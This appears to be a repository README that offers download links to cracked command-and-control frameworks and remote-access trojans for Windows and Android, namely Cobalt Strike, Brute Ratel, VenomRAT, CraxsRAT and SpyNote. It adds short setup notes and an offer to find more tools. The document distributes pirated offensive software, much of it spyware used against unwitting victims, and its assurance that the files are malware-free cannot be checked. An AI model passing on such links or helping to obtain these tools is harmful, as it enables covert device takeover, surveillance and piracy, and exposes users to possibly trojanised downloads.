# ⚠️ WARNING ⚠️
All of these tools *have* been checked for malware using both any.run and a real computer for malware. They have passed with no issues whatsoever and are considered clean.<br>***However, please still run these in a virtual machine.***

# Cracked Red Teaming Tools.
This is a full collection of red teaming tools which have been cracked by other people, if you need me to find anything, let me know via the issues tab.

### C2/RATs
##### Windows
| Tool | Link |
| :--- | ---: |
| Cobalt Strike v4.8 | [Download](https://anonfiles.com/M9r2O1o5z0/CobaltStrike48_pwn3rzs_cyberarsenal_7z) |
| Brute-Ratel | [Download](https://anonfiles.com/pdf5landz8/BruteRatel_zip) |
| VenomRAT v6.0.1 | [Download](https://anonfiles.com/8dS691ibzc) |

##### Android
| Tool | Link |
| :--- | ---: |
| CraxsRAT v3 | [Download](https://anonfiles.com/P9g5x8T8yf/CraxsRat-V3_2023_zip) |
| SpyNote v6.4 | [Download](https://anonfiles.com/N2c4O5ofz5/SpyNote_v6_4_rar) |

<br><br>
# Notes
###### Cobalt Strike
For Cobalt Strike you will have to deploy the teamserver on a Linux install such as Ubuntu, or whatever distro of your choice.<br>In order to run the Cobalt Strike client on your Windows install, you will have to run the following command:<br>`java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike-client.jar`.

On Linux, you can simply run `start.sh`.

###### Brute-Ratel
I am not sure whether or not this version of Brute-Ratel works properly, it has not been tested at all, however from the few basic functions *I am assuming it works*. If it does not, someone let me know

###### CraxsRat
This version of CraxsRAT appears to be quite unstable when it comes to connections, if someone wants me to, I can attempt to find a newer version of this rat.
